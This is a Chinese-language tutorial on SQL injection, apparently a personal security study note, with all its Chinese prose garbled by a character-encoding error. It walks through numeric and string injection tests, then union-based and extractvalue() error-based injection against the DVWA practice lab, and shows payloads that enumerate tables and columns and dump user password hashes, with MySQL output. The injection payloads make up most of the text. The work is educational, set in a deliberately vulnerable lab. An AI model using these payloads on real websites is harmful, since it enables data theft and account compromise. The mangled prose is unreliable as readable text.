---
slug: /net-security/06/01
---

**SQL æ³¨å…¥æ¼æ´**ï¼šæ²¡æœ‰å¯¹è¾“å…¥åšä¸€ä¸ªæ ¡éªŒå’Œè¿‡æ»¤ï¼Œä½¿å¾—è¾“å…¥å˜ä¸º SQL è¯­å¥å¹¶æ‰§è¡Œã€‚

SQL æ³¨å…¥æ¡ä»¶ï¼š

1. å‚æ•°å¯¹ç”¨æˆ·æ¥è¯´å¯æ§
2. å‚æ•°æœ€ç»ˆä¼šä½œä¸ºæ•°æ®åº“æŸ¥è¯¢è¯­å¥ä¹‹ä¸€



## ç±»å‹

### æ•°å­—å‹

è¾“å…¥çš„å‚æ•°ä¸ºæ•´å‹æ—¶ï¼Œè‹¥å­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œç§°ä¸º**æ•°å­—å‹æ³¨å…¥**æ¼æ´ã€‚æµ‹è¯•æ­¥éª¤ï¼š

1ï¸âƒ£ åŠ å•å¼•å·ï¼Œå¯¹åº” URLï¼š`www.test.com/test.php?id=1â€™`

å¯¹åº”çš„ SQL è¯­å¥ï¼š`select * from table where id=1â€™;` æŸ¥è¯¢å‡ºé”™ï¼Œåˆ™å¯èƒ½å­˜åœ¨æ¼æ´ã€‚

2ï¸âƒ£ åŠ  `and 1 = 1`ï¼Œå¯¹åº” URLï¼š`www.test.com/test.php?id=1 and 1 = 1;`

å¯¹åº”çš„ SQL è¯­å¥ï¼š`select * from table where id = 1 and 1 = 1;`ã€‚ æŸ¥è¯¢æ­£å¸¸ï¼Œåˆ™å¢åŠ å­˜åœ¨æ¼æ´å¯èƒ½æ€§ã€‚

3ï¸âƒ£ åŠ  `and 1 = 2`ï¼Œå¯¹åº” URLï¼š`www.test.com/test.php?id = 1 and 1 = 2;`

å¯¹åº”çš„ SQL è¯­å¥ï¼š`select * from table where id = 1 and 1 = 2;` æŸ¥è¯¢å¤±è´¥ï¼Œåˆ™ç¡®å®šæ¼æ´å­˜åœ¨ã€‚ 



### å­—ç¬¦å‹

è¾“å…¥å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œè‹¥å­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œæˆä¸º**å­—ç¬¦å‹æ³¨å…¥**æ¼æ´ã€‚æµ‹è¯•æ­¥éª¤ï¼š

å°è¯•è¾“å…¥ `1' or 1 = 1#`

å¯¹åº”çš„ SQL è¯­å¥ï¼š`select * from table where id='1' or 1 = 1 #'`ï¼Œå¦‚æœæŸ¥è¯¢å¾—åˆ°æ‰€æœ‰æ•°æ®ï¼Œåˆ™ç¡®å®šæ¼æ´å­˜åœ¨ã€‚

---

åœ¨ DVWA é¶åœºç¯å¢ƒä¸­ï¼Œå¯ä»¥åœ¨ SQL Injection ç»ƒä¹ ï¼š

![](http://img.wukaipeng.com/2023/0922-080220-image-20230922080219805.png)



### Union æ³¨å…¥

`union` å¯ä»¥è”åˆæŸ¥è¯¢å¤šä¸ªè¡¨ï¼š

```sql
mysql> select first_name, last_name from users where user_id = 1 union all select first_name, last_name from users where user_id = 2;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Gordon     | Brown     |
+------------+-----------+
2 rows in set (0.00 sec)
```

`union` æŸ¥è¯¢çš„è¡¨çš„åˆ—æ•°è¦ä¸€è‡´ã€‚

æ³¨å…¥çš„æ—¶å€™å¯ä»¥ç”¨  `order by 2` å»çŸ¥é“åç«¯æŸ¥è¯¢è¯­å¥æœ‰å¤šå°‘åˆ—ï¼š`1' order by  2#`

`order by <number>` è¿™é‡Œæ˜¯æ ¹æ®æŸ¥è¯¢ç»“æœä¸­çš„æŸåˆ—è¿›è¡Œæ’åºï¼Œå¦‚æœ `number` å¤§äºæŸ¥è¯¢å‡ºæ¥çš„åˆ—å‡ºï¼Œé‚£ä¹ˆä¼šæŠ¥é”™ï¼š

```sql
# æ ¹æ®ç»“æœç¬¬ä¸€åˆ—è¿›è¡Œæ’åº âœ…
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 1 #'
    -> ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Bob        | Smith     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
+------------+-----------+
5 rows in set (0.00 sec)

# æ ¹æ®ç»“æœç¬¬äºŒåˆ—è¿›è¡Œæ’åºï¼Œæ­£å¸¸ âœ…
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 2 #'
    -> ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
| Bob        | Smith     |
+------------+-----------+
5 rows in set (0.00 sec)

# æ ¹æ®ç»“æœç¬¬ä¸‰åˆ—è¿›è¡Œæ’åºï¼ŒæŠ¥é”™ âŒ
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 3 #'
    -> ;
ERROR 1054 (42S22): Unknown column '3' in 'order clause'
```

æ„é€  `union` è¯­å¥è·å–æ•°æ®åº“åç§°å’Œç‰ˆæœ¬ï¼š`1' union select database(), version() ;#`

![](http://img.wukaipeng.com/2023/0922-085205-image-20230922085204940.png)

ğŸŒŸ æ•°æ®åº“  `information_schema` 

ä¸‰ä¸ªé‡è¦çš„è¡¨ï¼š

1. `SCHEMATA`ï¼š åŒ…å«æ‰€æœ‰æ•°æ®åº“çš„åå­—
2. `TABLES`ï¼šåŒ…å«æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨ï¼Œé»˜è®¤å­—æ®µä¸º `table_name`
3. `COLUMNS`ï¼šåŒ…å«æ‰€æœ‰æ•°æ®çš„æ‰€æœ‰è¡¨çš„æ‰€æœ‰å­—æ®µ

ä¸‰ä¸ªé‡è¦çš„åˆ—

1. `TABLE_SCHEMAï¼šæ•°æ®åº“å`
2. `TABLE_NAME`ï¼šè¡¨å
3. `COLUMN_NAME`ï¼šå­—æ®µå

---

è”åˆæ³¨å…¥çš„è¿‡ç¨‹ï¼š

1ï¸âƒ£ åˆ¤æ–­åˆ—æ•°ã€æ˜¾ç¤ºä½

2ï¸âƒ£ è·å–ç›®æ ‡æ•°æ®åº“å

3ï¸âƒ£ è·å–ç›®æ ‡æ•°æ®åº“çš„æ‰€æœ‰è¡¨åã€å­—æ®µåã€å­—æ®µä¸­çš„æ•°æ®

---

è·å–ç›®æ ‡æ•°æ®åº“å

```sql
# æ³¨å…¥ SQLï¼š
1' union select 1, group_concat(table_name) from information_schema.tables where table_schema='dvwa'; #
```
```sql
# åº•å±‚ MySQL æ‰§è¡Œç»“æœ
mysql> select first_name, last_name from users where user_id='1' union select 1, group_concat(table_name) from information_schema.tables where table_schema='dvwa';
+------------+---------------------------+
| first_name | last_name                 |
+------------+---------------------------+
| admin      | admin                     |
| 1          | guestbook,k_account,users |
+------------+---------------------------+
2 rows in set (0.02 sec)
```

> `GROUP_CONCAT()`   å‡½æ•°å°†ç»„ä¸­çš„å­—ç¬¦ä¸²è¿æ¥æˆä¸ºå•ä¸ªå­—ç¬¦ä¸²ã€‚

è·å–å­—æ®µå

```sql
# æ³¨å…¥ SQL
1' union select 1, group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'; #
```
```sql
# åº•å±‚ MySQL æ‰§è¡Œç»“æœ
mysql> select first_name, last_name from users where user_id='1' union select 1, group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users';
+------------+---------------------------------------------------------------------------+
| first_name | last_name                                                                 |
+------------+---------------------------------------------------------------------------+
| admin      | admin                                                                     |
| 1          | user_id,first_name,last_name,user,password,avatar,last_login,failed_login |
+------------+---------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

è·å–å€¼

```sql
# æ³¨å…¥ SQL
1' union select user, password from users; #
```

```sql
# åº•å±‚ MySQL æ‰§è¡Œç»“æœ
mysql> select first_name, last_name from users where user_id='1' union select user, password from users;
+------------+----------------------------------+
| first_name | last_name                        |
+------------+----------------------------------+
| admin      | admin                            |
| admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb    | e99a18c428cb38d5f260853678922e03 |
| 1337       | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo      | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy     | 5f4dcc3b5aa765d61d8327deb882cf99 |
+------------+----------------------------------+
6 rows in set (0.00 sec)
```



### æŠ¥é”™æ³¨å…¥

åˆ©ç”¨æ•°æ®åº“æŠ¥é”™åˆ¤æ–­æ˜¯æœ‰å­˜åœ¨æ³¨å…¥ç‚¹

å¸¸ç”¨çš„ç‰¹æ®Šå­—ç¬¦ï¼š`\`, `;`, `%00`, `)`, `(`, `#`, `'`, `"` 

è¿™ä¸¤ä¸ªå‡½æ•°å¸¸ç”¨äºæŠ¥é”™æ³¨å…¥ï¼š

- `extractvalue()`ï¼šç”¨äºä» XML ä¸­è·å–æŒ‡å®šçš„å€¼
- `updatexml()`

---

å‡½æ•° `extractvalue(xml_frag, xpath_expr)`ï¼š

1. `xml_frag`: è¿™æ˜¯è¦å¤„ç†çš„ XML æ•°æ®çš„å­—ç¬¦ä¸²ã€‚
2. `xpath_expr`: è¿™æ˜¯ä¸€ä¸ª XPath è¡¨è¾¾å¼ï¼Œç”¨äºæŒ‡å®šä½ æƒ³ä» XML æ•°æ®ä¸­æå–çš„å€¼çš„ä½ç½®ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ `EXTRACTVALUE()` å‡½æ•°çš„ç®€å•ç¤ºä¾‹ï¼š

```sql
SELECT EXTRACTVALUE('<book><title>Learn MySQL</title></book>', '/book/title');
```

åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ`EXTRACTVALUE()` å‡½æ•°ä»ç»™å®šçš„ XML å­—ç¬¦ä¸²ä¸­æå–ä¹¦çš„æ ‡é¢˜ï¼Œå¹¶è¿”å›å€¼ "Learn MySQL"ã€‚

---

åˆ©ç”¨å‡½æ•° `extractvalue(xml_frag, xpath_expr)` æŠ¥é”™è·å–ä¿¡æ¯ï¼Œç”±äº `xml_frag` æ¥å—ä»»æ„å€¼ï¼Œæ‰€ä»¥ä¸»è¦åˆ©ç”¨ `xpath_expr` è§£æç‰¹ç‚¹æ¥çˆ†ç ´ï¼š

1ï¸âƒ£ è·å–æ•°æ®åº“å

```sql
mysql>  select first_name, last_name from users where user_Id = 1 and extractvalue(1, concat(0x7e, database(), version()));
ERROR 1105 (HY000): XPATH syntax error: '~dvwa5.5.54-0+deb8u1-log'
```

2ï¸âƒ£ è·å–è¡¨å

```sql
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='dvwa')));
ERROR 1105 (HY000): XPATH syntax error: '~guestbook,k_account,users'
```

3ï¸âƒ£ è·å–åˆ—å

```sql
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')));
ERROR 1105 (HY000): XPATH syntax error: '~user_id,first_name,last_name,us'

# ğŸš« è¿™é‡Œçš„é”™è¯¯è¿”å›è¢«æˆªæ–­äº†ï¼Œæˆ‘ä»¬æ”¹ç”¨ limit æ¡ä»¶æ¥å•ç‹¬è·å–æ¯ä¸€ä¸ªåˆ—å

mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1)));
ERROR 1105 (HY000): XPATH syntax error: '~user_id'

mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 1,1)));
ERROR 1105 (HY000): XPATH syntax error: '~first_name'

â€¦â€¦

# ğŸš« å¦å¤–ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨ substring å»ç»§ç»­è·å–å‰©ä½™çš„å­—ç¬¦ä¸²
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select substring(group_concat(column_name), 30) from information_schema.columns where table_schema='dvwa' and table_name='users')));
ERROR 1105 (HY000): XPATH syntax error: '~user,password,avatar,last_login'
```

4ï¸âƒ£ è·å–è´¦å·å¯†ç 

```sql
# è·å–è´¦å·
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select user_id from dvwa.users limit 0,1)));
ERROR 1105 (HY000): XPATH syntax error: '~1'

# è·å–å¯†ç 
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select password from dvwa.users where user_id = 1 limit 0,1)));
ERROR 1105 (HY000): XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
```









